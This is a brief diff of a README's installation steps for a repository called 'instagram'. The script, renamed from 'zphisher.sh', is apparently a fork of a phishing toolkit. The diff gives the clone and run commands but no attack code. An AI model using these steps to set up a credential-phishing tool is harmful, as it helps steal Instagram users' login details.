@@ -20,10 +20,10 @@
 $ git clone git://github.com/yogeshpcte/instagram.git
 ```
 
-- Change to cloned directory and run `zphisher.sh` -
+- Change to cloned directory and run `instagram.sh` -
 ```
 $ cd instagram
-$ bash instagram.sh
+$ bash instagram.sh or ./instagram.sh
 ```
 
 - On first launch, It'll install the dependencies and that's it. `instagram` is installed.
